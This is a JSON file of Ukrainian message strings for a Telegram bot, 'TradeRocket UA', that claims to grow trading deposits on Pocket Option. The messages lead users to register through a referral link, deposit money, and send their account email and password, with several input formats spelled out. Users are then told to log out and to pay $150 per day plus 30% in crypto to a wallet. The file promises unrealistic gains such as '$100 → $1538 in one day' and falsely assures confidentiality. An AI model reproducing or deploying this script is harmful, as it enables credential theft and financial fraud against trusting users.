{
    "start_message": "🚀 Ласкаво просимо до TradeRocket UA!\n\nКілька місяців тому ми, як і ти, шукали спосіб швидко і безпечно розганяти депозити на Pocket Option. Ми перепробували десятки стратегій, поки не створили TradeRocket UA — бота, який робить це автоматично.\n\n🔹 Його місія проста: розганяти депозити, щоб ти заробляв стабільно і без хаосу\n🔹 Підключаєш аккаунт — бот шукає найкращі точки входу і торгує ЗАМІСТЬ ТЕБЕ!\n🔹 Твій баланс росте, поки ти відпочиваєш!\n\nTradeRocket UA створений, щоб твій депозит працював на максимум\n\n⚙️ Для навігації використовуйте кнопки нижче 👇",

    "platform_select_message": "🚀 Обери платформу для розгону депозиту!\n\nТепер ти на кроці, коли потрібно вибрати, де саме хочеш розігнати свій депозит. У нас є два популярних варіанти:\n🔹 <b>Pocket Option</b> — класика для швидких розгонів.\n🔹 <b>Binance</b> — для тих, хто хоче працювати з криптою.\n\n⚠️ <b>Важливо:</b> у тебе тільки одна безкоштовна спроба, тож використовуй її мудро, щоб оцінити, як бот працює та наскільки ефективно може примножувати твій баланс.\n\nОбери платформу і зроби перший крок до росту свого капіталу!",

    "binance_flow_message": "🚀 Ви обрали платформу: <b>Binance</b>\n\nЗараз наш бот TradeRocket UA на Binance тимчасово недоступний.\n\nВін працює у тестовому режимі, і ми адаптуємо та покращуємо його роботу, щоб у майбутньому він міг розганяти депозити на найвищому рівні.\n\n⚠️ Як тільки бот стане доступним на Binance, ми одразу повідомимо вас, щоб ви могли скористатися розгоном депозиту.\n\nДякуємо за розуміння та слідкуйте за оновленнями!",

    "pocket_option_flow_message": "🚀 Ви обрали платформу: <b>Pocket Option</b>!\n\nТут наш бот TradeRocket UA буде розганяти ваш депозит максимально ефективно!\n\n❗ Щоб почати, вам потрібно зареєструвати акаунт по нашому посиланню нижче.\n\n🔗 <b>Посилання на реєстрацію акаунта:</b>\n<a href='{referral_link}'>КЛАЦАЙ СЮДИ</a>\n\nПісля того як акаунт буде створено, натисніть кнопку «Акаунт зареєстрував!».",

    "pocket_option_registered_success": "✅ Акаунт успішно перевірено\n\nВітаємо! Ваш акаунт зареєстрований по нашому посиланню і готовий до підключення.\n\nНаступний обов’язковий крок — поповнення рахунку мінімум на ${min_deposit}.\n\n❕Рекомендація: ${min_deposit} — мінімум для старту. Якщо хочете більш плавний і стійкий розгін — ідеально розглядати більший депозит (200$, 300$, 500$ і т.д.).\n\nПісля поповнення натисніть «Депозит поповнено!», і бот перевірить баланс та підключиться для старту розгону.",

    "pocket_option_ask_for_uid": "Тепер нам потрібен ID вашого акаунта Pocket Option, щоб бот перевірив реєстрацію та підключив депозит для розгону.\n\n👇 Будь ласка, надішліть нам ваш ID (наприклад: 123456789)",

    "pocket_option_verification_successful": "✅ Відмінно! Акаунт успішно підтверджено\n\nТепер все готово, щоб почати розгін вашого депозиту.\n\nЩоб запустити процес:\n\nНадішліть ваш логін та пароль від Pocket Option у одному з підтримуваних форматів:\n\n1) Два рядки:\n\nyouremail@example.com\nyourpassword123\n\n2) З мітками (будь-який порядок):\nEmail: youremail@example.com\nPassword: yourpassword123\nабо: Почта youremail@example.com Пароль yourpassword123\n\n3) В один рядок з розділювачем (кома, крапка з комою, слеш або вертикальна риска):\nyouremail@example.com, yourpassword123\nyouremail@example.com / yourpassword123\nyouremail@example.com | yourpassword123\n\n🔒 Ваші дані обробляються з максимальною конфіденційністю і використовуються лише для роботи бота по розгону депозиту.",

    "pocket_option_insufficient_deposit": "❌ Баланс недостатній для старту!\n\nНа вашому акаунті зараз менше {min_deposit}.\n\nНаш бот TradeRocket UA не зможе розпочати розгін депозиту, адже алгоритм розрахований тільки на суми від {min_deposit}.\n\n❕ Щоб бот міг працювати правильно і без ризику неправильного масштабування ставок, будь ласка, поповніть баланс на мінімум {min_deposit}.\n\n👇 Після поповнення натискайте кнопку «Депозит поповнено!».",

    "pocket_option_not_found": "❌ Щось пішло не так!\n\nМи помітили, що ваш акаунт не був створений по нашому реферальному посиланні!\n\n⚠️ Щоб бот міг правильно підключити акаунт і почати розгін, важливо зареєструвати акаунт саме за нашим посиланням.\n\nБудь ласка, перевірте, що ви використали правильне посилання, і зареєструйтесь ще раз.\n\nПісля правильної реєстрації натискайте «Акаунт зареєстрував!».",

    "registration_check_failed": "❌ Щось пішло не так!\n\nМи помітили, що ваш акаунт не був створений по нашому реферальному посиланню!\n\n⚠️ Щоб бот міг правильно підключити аккаунт і почати розгін, важливо зареєструвати акаунт саме за нашим посиланням.(клац)\n\nБудь ласка, перевірте, що ви використали правильне посилання, і зареєструйтесь ще раз.\n\nПісля правильної реєстрації натискайте “Акаунт зареєстрував!”.",

    "pocket_option_connecting": "⏳ Підключення вашого акаунта\n\nБот зараз додає ваш акаунт до нашої системи.\nЦей процес може зайняти 3–5 хвилин.\n\nБудь ласка, терпляче зачекайте — скоро ми зможемо почати розгін вашого депозиту! 🚀",

    "pocket_option_connected_ready": "✅ Вітаємо! Ваш акаунт підключено і готовий до розгону\n\n⚠️ Важливо: перед початком розгону вийдіть зі свого акаунта, щоб забезпечити безпеку і уникнути проблем з брокером.\n\nНаш бот використовує штучний інтелект, щоб розганяти депозит індивідуально для кожного акаунта, мінімізуючи ризики.\n\n⏰ Кожну годину ви отримуватимете оновлення балансу.\n📊 Також можна перевірити баланс у будь-який час кнопкою «Поточний баланс».\n❗ Щоб зупинити розгін, натисніть кнопку «Зупинити розгін».\n\nСередній результат на Pocket Option: старт $100 → до $1538 за один день (результати можуть відрізнятися залежно від ринку).\n\nЯкщо готові розганяти депозит — натискайте «Почати розгін» нижче! 🚀",

    "pocket_option_boosting_started": "🚀 Ваш акаунт зараз у режимі розгону!\n\n⚠️ Якщо ви ще не вийшли зі свого акаунта, будь ласка, вийдіть протягом 3 хвилин. Після цього бот почне розганяти ваш депозит.\n\n⏰ Бот надсилатиме оновлення вашого балансу кожну 1 годину.\n\n📊 Також можна перевірити баланс у будь-який час кнопкою «Поточний баланс».\n\n🛑 Щоб зупинити розгін, натисніть кнопку «Зупинити розгін».",

    "pocket_option_stopping": "⏳ Зупиняємо процес розгону... Будь ласка, зачекайте 3–5 хвилин перед повторним входом у акаунт.",

    "pocket_option_stopped": "✅ Розгін зупинено. Можете знову увійти у свій акаунт. Будемо раді бачити вас знову!",

    "pocket_option_boost_finished": "✅ Розгін депозиту успішно завершено!\n\nПочатковий баланс: {initial_balance}\nБаланс після розгону: {final_balance}\n\n⚠️ Перед тим як знову увійти у свій акаунт, будь ласка, зачекайте 5 хвилин, щоб бот повністю деактивував ваш акаунт у системі.\n\nЯкщо хочете почати нову сесію розгону, просто натисніть кнопку нижче. 🚀",

    "pocket_option_paid_boost": "❗️ Ваша безкоштовна сесія розгону на Pocket Option використана!\n\nНаступний розгін депозиту коштуватиме <b>150 $</b> за день розгону + <b>30%</b> від суми після розгону.\n\n<b>Сума до оплати:</b> {amount_to_pay}\n\n💰 Оплата приймається тільки криптовалютою.\n\nНаш TRC20 гаманець:\n<code>{wallet_address}</code>\n\nПісля завершення оплати, будь ласка, натисніть кнопку «Я оплатив» та надішліть скріншот оплати нашому менеджеру — <a href='https://t.me/Trdrocketua_support'>зв’язатися з підтримкою</a>",

    "request_payment_screenshot": "Будь ласка, надішліть скріншот вашої оплати, щоб продовжити.",
    "payment_screenshot_received": "Дякуємо! Ми отримали скріншот і незабаром підтвердимо оплату. Після підтвердження розгін буде активовано.",

    "invalid_login_format": "❌ Невірний формат. Надішліть email і пароль в одному з підтримуваних форматів (див. вище).",
    "invalid_uid_format": "❌ Невірний формат. Надішліть ID як послідовність цифр, наприклад: 123456789",

    "pocket_option_current_balance": "Ваш поточний баланс: {current_balance}\nЧас до завершення розгону: {remaining_time}",
    "current_balance": "💰 Ваш поточний баланс\n\n- Баланс: {current_balance}\n- Залишилось часу: {remaining_time}",

    "stats_title": "Онлайн статистика розганяємих акаунтів — тільки Pocket Option",
    "admin_welcome": "👋 Ласкаво просимо до адмін-панелі!"
}